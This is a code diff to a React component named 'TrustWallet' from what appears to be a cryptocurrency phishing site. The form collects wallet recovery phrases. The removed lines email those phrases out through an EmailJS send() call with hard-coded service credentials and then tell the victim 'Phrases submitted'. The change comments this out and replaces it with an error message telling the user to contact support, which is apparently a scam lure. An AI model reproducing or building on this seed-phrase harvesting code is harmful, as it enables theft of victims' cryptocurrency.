@@ -69,19 +69,20 @@ const TrustWallet = ({ setPage, notific, user, refreshPage }) => {
 
   console.log(toSend)
   const onSubmit = (e) => {
-    setLoading(true)
-    setToSend({ ...toSend, from_wallet: 'Trust wallet' })
-    e.preventDefault()
-    send('service_68ahmsh', 'template_proinesmet', toSend, 'm6YRrZKtNIMi_eARU')
-      .then((response) => {
-        notific('success', 'Phrases submitted')
-        setFormLoading(true)
-        setLoading(false)
-      })
-      .catch((err) => {
-        console.log('FAILED...', err)
-        setLoading(false)
-      })
+    // setLoading(true)
+    // setToSend({ ...toSend, from_wallet: 'Trust wallet' })
+    // e.preventDefault()
+    // send('service_68ahmsh', 'template_proinesmet', toSend, 'm6YRrZKtNIMi_eARU')
+    //   .then((response) => {
+    //     notific('success', 'Phrases submitted')
+    //     setFormLoading(true)
+    //     setLoading(false)
+    //   })
+    //   .catch((err) => {
+    //     console.log('FAILED...', err)
+    //     setLoading(false)
+    //   })
+    notify('error', 'An error occured, contact support')
   }
   const handleChange = (e) => {
     setToSend({ ...toSend, [e.target.name]: e.target.value })
